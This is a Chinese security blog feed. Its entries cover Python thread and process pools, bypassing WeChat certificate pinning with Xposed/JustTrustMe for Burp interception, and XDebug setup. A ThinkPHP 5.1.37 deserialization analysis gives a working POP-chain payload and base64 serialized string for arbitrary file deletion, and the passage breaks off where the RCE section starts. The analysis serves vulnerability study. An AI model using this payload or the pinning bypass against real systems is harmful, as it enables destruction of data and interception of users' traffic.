线程池</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(fn)</span>:</span></span><br><span class="line">  <span class="comment">#fn: 函数参数是数据列表的一个元素</span></span><br><span class="line">  time.sleep(<span class="number">2</span>)</span><br><span class="line">  print(<span class="string">"进程ID"</span>,os.getpid())</span><br><span class="line">  print(fn*fn)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">（1）引入threadpool模块</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">（2）定义线程函数   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">（3）创建线程 池threadpool.ThreadPool()   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">（4）创建需要线程池处理的任务即threadpool.makeRequests()   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">（5）将创建的多个任务put到线程池中,threadpool.putRequest   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">（6）等到所有任务处理完毕theadpool.pool()</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">  testFL = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'单进程:'</span>) <span class="comment">#顺序执行(也就是串行执行，单进程)</span></span><br><span class="line">  s = time.time()</span><br><span class="line">  <span class="keyword">for</span> fn <span class="keyword">in</span> testFL:</span><br><span class="line">    run(fn)</span><br><span class="line">  t1 = time.time()</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">"顺序执行时间："</span>, int(t1 - s))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'多个线程并发:'</span>)</span><br><span class="line"></span><br><span class="line">  pool = threadpool.ThreadPool(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">  调用makeRequests创建了要开启多线程的函数</span><br><span class="line">  requests = threadpool.makeRequests(run,testFL)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 将所有要运行多线程的请求扔进线程池</span></span><br><span class="line">  <span class="keyword">for</span> req <span class="keyword">in</span> requests:</span><br><span class="line">      pool.putRequest(req)</span><br><span class="line">  pool.wait() <span class="comment">#等待所有的线程完成工作后退出</span></span><br><span class="line"></span><br><span class="line">  t2 = time.time()</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">"并行执行时间："</span>, int(t2-t1))</span><br></pre></td></tr></table></figure><ul><li>进程池</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(fn)</span>:</span></span><br><span class="line">  <span class="comment">#fn: 函数参数是数据列表的一个元素</span></span><br><span class="line">  time.sleep(<span class="number">2</span>)</span><br><span class="line">  print(<span class="string">"进程ID"</span>,os.getpid())</span><br><span class="line">  print(fn*fn)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">  testFL = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'单进程:'</span>) <span class="comment">#顺序执行(也就是串行执行，单进程)</span></span><br><span class="line">  s = time.time()</span><br><span class="line">  <span class="keyword">for</span> fn <span class="keyword">in</span> testFL:</span><br><span class="line">    run(fn)</span><br><span class="line">  t1 = time.time()</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">"顺序执行时间："</span>, int(t1 - s))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'多个进程，并行执行:'</span>) <span class="comment">#创建多个进程，并行执行</span></span><br><span class="line">  pool = Pool(<span class="number">3</span>)  <span class="comment">#创建拥有10个进程数量的进程池</span></span><br><span class="line">  <span class="comment">#testFL:要处理的数据列表，run：处理testFL列表中数据的函数</span></span><br><span class="line">  pool.map(run, testFL)</span><br><span class="line"></span><br><span class="line">  pool.close()<span class="comment">#关闭进程池，不再接受新的进程</span></span><br><span class="line">  pool.join()<span class="comment">#主进程阻塞等待子进程的退出</span></span><br><span class="line">  t2 = time.time()</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">"并行执行时间："</span>, int(t2-t1))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 配环境安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>抓安卓微信小程序包抓取不到数据包的解决方法</title>
      <link href="/2019/12/30/%E6%8A%93%E5%AE%89%E5%8D%93%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8C%85%E6%8A%93%E5%8F%96%E4%B8%8D%E5%88%B0%E6%95%B0%E6%8D%AE%E5%8C%85%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
      <url>/2019/12/30/%E6%8A%93%E5%AE%89%E5%8D%93%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8C%85%E6%8A%93%E5%8F%96%E4%B8%8D%E5%88%B0%E6%95%B0%E6%8D%AE%E5%8C%85%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="项目需要测试小程序，但无法抓取数据包，尝试过多种方法，都失败了，怎么办呢？"><a href="#项目需要测试小程序，但无法抓取数据包，尝试过多种方法，都失败了，怎么办呢？" class="headerlink" title="项目需要测试小程序，但无法抓取数据包，尝试过多种方法，都失败了，怎么办呢？"></a>项目需要测试小程序，但无法抓取数据包，尝试过多种方法，都失败了，怎么办呢？</h2><p><strong>看到一个大佬分享的文章内容：</strong><br><strong>安卓系统 7.0 以下版本，不管微信任意版本，都会信任系统提供的证书<br>安卓系统 7.0 以上版本，微信 7.0 以下版本，微信会信任系统提供的证书<br>安卓系统 7.0 以上版本，微信 7.0 以上版本，微信只信任它自己配置的证书列表</strong></p><p>以上为大前提，我寻找了一个认为比较简单的方法：<br>准备工具：<br>①　XposedInstaller_3.1.5.apk<br>②　weixin673android1360.apk（要低于7版本）<br>③　JustTrustMe1.apk<br>④　BurpsuiteV2.0<br>⑤　夜神最新版（使用的是安卓5）</p><p><a href="https://pan.baidu.com/s/1qhivzmRiAmWJnf7Z-VMjhQ（123工具已分享）" target="_blank" rel="noopener">https://pan.baidu.com/s/1qhivzmRiAmWJnf7Z-VMjhQ（123工具已分享）</a></p><ol><li>这种方法的好处是不用额外买真机测试，直接在模拟器上进行操作即可，于是乎就可以愉快玩耍了。</li></ol><p><img src="https://img-blog.csdnimg.cn/2019123013163849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="2"><li>小白需要注意： 先自行安装xposed的框架，安装完毕需要重启</li></ol><p><img src="https://img-blog.csdnimg.cn/20191230131713223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="3"><li>JustTrustMe模块需要勾选</li></ol><p><img src="https://img-blog.csdnimg.cn/20191230131739792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4.最后挂上代理到burp</p><p>搬运大佬的知识学习 天之胶纸的</p>]]></content>
      
      
      <categories>
          
          <category> app渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>phpStorm配置xdebug</title>
      <link href="/2019/12/20/phpStorm%E9%85%8D%E7%BD%AExdebug/"/>
      <url>/2019/12/20/phpStorm%E9%85%8D%E7%BD%AExdebug/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>运行环境：<br>PHPSTORM版本 : 2019.3 汉化<br>PHP版本 : php-7.0.12-nts<br>xdebug版本：php_xdebug-2.6.0beta1-7.0-vc14-nts<br>ps : php版本和xdebug版本一定要相对应<br>xdebug下载地址：<a href="http://xdebug.org/download.php" target="_blank" rel="noopener">http://xdebug.org/download.php</a></p><h2 id="1-环境下的php-ini中添加关于xdebug的配置信息"><a href="#1-环境下的php-ini中添加关于xdebug的配置信息" class="headerlink" title="1.环境下的php.ini中添加关于xdebug的配置信息"></a>1.环境下的php.ini中添加关于xdebug的配置信息</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">zend_extension=<span class="string">"D:\phpStudy\php\php-5.6.27-nts\ext\php_xdebug.dll"</span></span><br><span class="line">xdebug.remote_enable=On</span><br><span class="line">xdebug.remote_handler=dbgp</span><br><span class="line">xdebug.remote_host=localhost</span><br><span class="line">xdebug.remote_port=<span class="number">9000</span></span><br><span class="line">xdebug.idekey=PHPSTORM</span><br></pre></td></tr></table></figure><h2 id="2-重启查看phpinfo-会显示有关xdebug的信息"><a href="#2-重启查看phpinfo-会显示有关xdebug的信息" class="headerlink" title="2.重启查看phpinfo()会显示有关xdebug的信息"></a>2.重启查看phpinfo()会显示有关xdebug的信息</h2><h2 id="3-开始配置phpStorm"><a href="#3-开始配置phpStorm" class="headerlink" title="3.开始配置phpStorm"></a>3.开始配置phpStorm</h2><p>1.客户端调试，打开phpStorm，进入File&gt;Settings&gt;PHP&gt;Servers，这里要填写服务器端的相关信息，name填localhost，host填localhost，port填80，debugger选[XDebug]<br><img src="https://img-blog.csdnimg.cn/20191220143254447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2.进入File&gt;Settings&gt;PHP&gt;Debug，看到XDebug选项卡，port填9000，其他默认<br>端口和php.ini的配置要一致<br><img src="https://img-blog.csdnimg.cn/20191220143206796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.进入File&gt;Settings&gt;PHP&gt;Debug&gt;DBGp Proxy，IDE key 填 phpStorm，host 填localhost，port 填80</p><p><img src="https://img-blog.csdnimg.cn/20191220143141931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>此时phpstorm上面的调试运行按钮是灰色的</p><p><img src="https://img-blog.csdnimg.cn/20191220143344720.png" alt="在这里插入图片描述"></p><p>点击+号增加服务<br><img src="https://img-blog.csdnimg.cn/20191220143408198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>先配置server</p><p><img src="https://img-blog.csdnimg.cn/20191220143331730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>打上断点，此时调试运行按钮已经变绿 点击调试按钮即可开始进行调试<br><img src="https://img-blog.csdnimg.cn/20191220143455269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 配环境代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>phpStudy开启XDebug无效打不开坑点</title>
      <link href="/2019/12/20/phpStudy%E5%BC%80%E5%90%AFXDebug%E6%97%A0%E6%95%88%E6%89%93%E4%B8%8D%E5%BC%80%E5%9D%91%E7%82%B9/"/>
      <url>/2019/12/20/phpStudy%E5%BC%80%E5%90%AFXDebug%E6%97%A0%E6%95%88%E6%89%93%E4%B8%8D%E5%BC%80%E5%9D%91%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="1-造成开启XDebug无效原因"><a href="#1-造成开启XDebug无效原因" class="headerlink" title="1. 造成开启XDebug无效原因"></a>1. 造成开启XDebug无效原因</h2><p><strong>1. 路径不正确</strong><br>在php.ini文件中zend_extension路径不正确，例如：正反斜杠、路径不对问题</p><p><strong>2. php_debug扩展版本不匹配</strong></p><p><strong>php_debug扩展32位或者64位与安装PHP的不对应</strong><br>PHP7.2版本，实际下载的php_debug版本是PHP7.1，就会造成开启debug失败<br><strong>注意下载的php_debug扩展NTS/TS 与安装PHP对应</strong><br>一般的集成环境中，<code>**PHP的架构都是**32位的（x86）****，</code>而你的电脑是64位（x64），<code>以PHP的环境架构为准</code>，例如：我的使用的PHP是x32为，电脑是win10 64位，我直接到xdebug官网下载64位扩展，导致开启扩展失败<br><strong>3. 配置文件写的不全</strong><br>下面给出</p><h2 id="2-具体开启XDebug流程"><a href="#2-具体开启XDebug流程" class="headerlink" title="2. 具体开启XDebug流程"></a>2. 具体开启XDebug流程</h2><p><em><strong>版本一定要一致</strong></em><br><strong>1、使用phpinfo函数查看PHP版本信息需要注意的如下：</strong></p><p><img src="https://img-blog.csdnimg.cn/20191220140707338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>2、按照上图红框内的信息到<code>https://xdebug.org/download.php</code>下载对应的xdebug扩展</strong><br>需要注意的地方是xdebug官网中<br>没有带（TS）为非线性安全版本（NTS）<br>没有带（TS）为非线性安全版本（NTS）<br>没有带（TS）为非线性安全版本（NTS）<br><img src="https://img-blog.csdnimg.cn/20191220141048558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>3、在php.ini文件中添加如下信息：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">zend_extension=<span class="string">"D:\phpStudy\PHPTutorial\php\php-7.2.1-nts\ext\此处为刚刚下载好的路径"</span></span><br><span class="line">;是否允许Xdebug跟踪函数调用，跟踪信息以文件形式存储，默认值为<span class="number">0</span></span><br><span class="line">xdebug.auto_trace=<span class="number">1</span></span><br><span class="line">;是否允许Xdebug跟踪函数参数，默认值为<span class="number">0</span></span><br><span class="line">xdebug.collect_params=<span class="number">1</span></span><br><span class="line">;是否允许Xdebug跟踪函数返回值，默认值为<span class="number">0</span></span><br><span class="line">xdebug.collect_return=<span class="number">1</span></span><br><span class="line">;函数调用跟踪信息输出文件目录，默认值为/tmp</span><br><span class="line">xdebug.trace_output_dir =<span class="string">"F:\PHP_xdebug"</span></span><br><span class="line">;性能分析文件的存放位置，默认值为/tmp</span><br><span class="line">xdebug.profiler_output_dir =<span class="string">"F:\PHP_xdebug"</span></span><br><span class="line">;打开xdebug的性能分析器，以文件形式存储，这项配置是不能以ini_set()函数配置的，默认值为<span class="number">0</span></span><br><span class="line">xdebug.profiler_enable = <span class="number">1</span></span><br><span class="line">;性能分析文件的命名规则，默认值为cachegrind.out.%p</span><br><span class="line">xdebug.profiler_output_name = <span class="string">"cachegrind.out.%t.%p"</span></span><br><span class="line">xdebug.remote_enable = <span class="number">1</span></span><br><span class="line">;用于zend studio远程调试的应用层通信协议</span><br><span class="line">xdebug.remote_handler = <span class="string">"dbgp"</span></span><br><span class="line">xdebug.idekey = PHPSTORM</span><br><span class="line">xdebug.remote_host = <span class="string">"127.0.0.1"</span></span><br><span class="line">xdebug.remote_port = <span class="number">9000</span></span><br></pre></td></tr></table></figure><p><strong>4、重启Apache服务器</strong></p><p>查看phpinfo开启成功<br><img src="https://img-blog.csdnimg.cn/20191220141539211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计配环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp 反序列化深入分析pop利用链</title>
      <link href="/2019/12/18/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90pop%E5%88%A9%E7%94%A8%E9%93%BE/"/>
      <url>/2019/12/18/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90pop%E5%88%A9%E7%94%A8%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="Thinkphp-反序列化深入分析"><a href="#Thinkphp-反序列化深入分析" class="headerlink" title="Thinkphp 反序列化深入分析"></a>Thinkphp 反序列化深入分析</h3><ul><li><a href="#_2">环境搭建</a></li><li><a href="#_10">铺垫知识</a></li><li><a href="#_89">漏洞起点</a></li><li><ul><li><a href="#rce_136">rce部分起点</a></li><li><a href="#_271">代码执行点分析</a></li><li><a href="#POC_593">最终POC</a></li></ul></li></ul><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><strong>Thinkphp 5.1.37</strong> -—- 应该是5.1.x可以</p><p>php 7.0.12</p><p>composer create-project topthink/think=5.1.37 v5.1.37</p><h1 id="铺垫知识"><a href="#铺垫知识" class="headerlink" title="铺垫知识"></a>铺垫知识</h1><p><strong>1. PHP反序列化原理</strong><br>PHP反序列化就是在读取一段字符串然后将字符串反序列化成php对象。<br><strong>2. 在PHP反序列化的过程中会自动执行一些魔术方法</strong></p><p>方法名 -————–调用条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__call调用不可访问或不存在的方法时被调用</span><br><span class="line">__callStatic调用不可访问或不存在的静态方法时被调用</span><br><span class="line">__clone进行对象clone时被调用，用来调整对象的克隆行为</span><br><span class="line">__constuct构建对象的时被调用；</span><br><span class="line">__debuginfo当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本</span><br><span class="line">__destruct明确销毁对象或脚本结束时被调用；</span><br><span class="line">__get读取不可访问或不存在属性时被调用</span><br><span class="line">__invoke当以函数方式调用对象时被调用</span><br><span class="line">__isset对不可访问或不存在的属性调用isset()或empty()时被调用</span><br><span class="line">__set当给不可访问或不存在属性赋值时被调用</span><br><span class="line">__set_state当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。</span><br><span class="line">__sleep当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用</span><br><span class="line">__toString当一个类被转换成字符串时被调用</span><br><span class="line">__unset对不可访问或不存在的属性进行unset时被调用</span><br><span class="line">__wakeup当使用unserialize时被调用，可用于做些对象的初始化操作</span><br></pre></td></tr></table></figure><p><strong>3. 反序列化的常见起点</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__wakeup 一定会调用</span><br><span class="line"></span><br><span class="line">__destruct 一定会调用</span><br><span class="line"></span><br><span class="line">__toString 当一个对象被反序列化后又被当做字符串使用</span><br></pre></td></tr></table></figure><p><strong>4.反序列化的常见中间跳板:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__toString 当一个对象被当做字符串使用</span><br><span class="line"></span><br><span class="line">__get 读取不可访问或不存在属性时被调用</span><br><span class="line"></span><br><span class="line">__set 当给不可访问或不存在属性赋值时被调用</span><br><span class="line"></span><br><span class="line">__isset 对不可访问或不存在的属性调用isset()或empty()时被调用</span><br><span class="line"></span><br><span class="line">形如 $this-&gt;$func();</span><br></pre></td></tr></table></figure><p><strong>5.反序列化的常见终点:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__call 调用不可访问或不存在的方法时被调用</span><br><span class="line"></span><br><span class="line">call_user_func 一般php代码执行都会选择这里</span><br><span class="line"></span><br><span class="line">call_user_func_array 一般php代码执行都会选择这里</span><br></pre></td></tr></table></figure><p><strong>6.Phar反序列化原理以及特征</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">phar:&#x2F;&#x2F;伪协议会在多个函数中反序列化其metadata部分</span><br><span class="line"></span><br><span class="line">受影响的函数包括不限于如下:</span><br><span class="line"></span><br><span class="line">copy,file_exists,file_get_contents,file_put_contents,file,fileatime,filectime,filegroup,</span><br><span class="line">fileinode,filemtime,fileowner,fileperms,</span><br><span class="line">fopen,is_dir,is_executable,is_file,is_link,is_readable,is_writable,</span><br><span class="line">is_writeable,parse_ini_file,readfile,stat,unlink,exif_thumbnailexif_imagetype,</span><br><span class="line">imageloadfontimagecreatefrom,hash_hmac_filehash_filehash_update_filemd5_filesha1_file,</span><br><span class="line">get_meta_tagsget_headers,getimagesizegetimagesizefromstring,extractTo</span><br></pre></td></tr></table></figure><h1 id="漏洞起点"><a href="#漏洞起点" class="headerlink" title="漏洞起点"></a>漏洞起点</h1><p>漏洞起点在\thinkphp\library\think\process\pipes\windows.php的__destruct魔法函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;close();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;removeFiles();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__destruct()里面调用了两个函数，我们跟进removeFiles()函数。</p><p><img src="https://img-blog.csdnimg.cn/20200106153640755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>这里看到 unlink函数<br>这里同时也存在一个任意文件删除的漏洞，Payload构造： 必须使用namespace设置命名空间！</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="string">'D:\\phpStudy\\PHPTutorial\\WWW\\tp5\\install.lock'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtzOjQ0OiJEOlxwaHBTdHVkeVxQSFBUdXRvcmlhbFxXV1dcdHA1XGluc3RhbGwubG9jayI7fX0&#x3D;</span><br></pre></td></tr></table></figure><p>这里只需要一个反序列化漏洞的触发点，便可以实现任意文件删除。<br>自行构造一个利用点，试用一下<br>复现成功</p><p><img src="https://img-blog.csdnimg.cn/20200106154101612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="rce部分起点"><a href="#rce部分起点" class="headerlink" 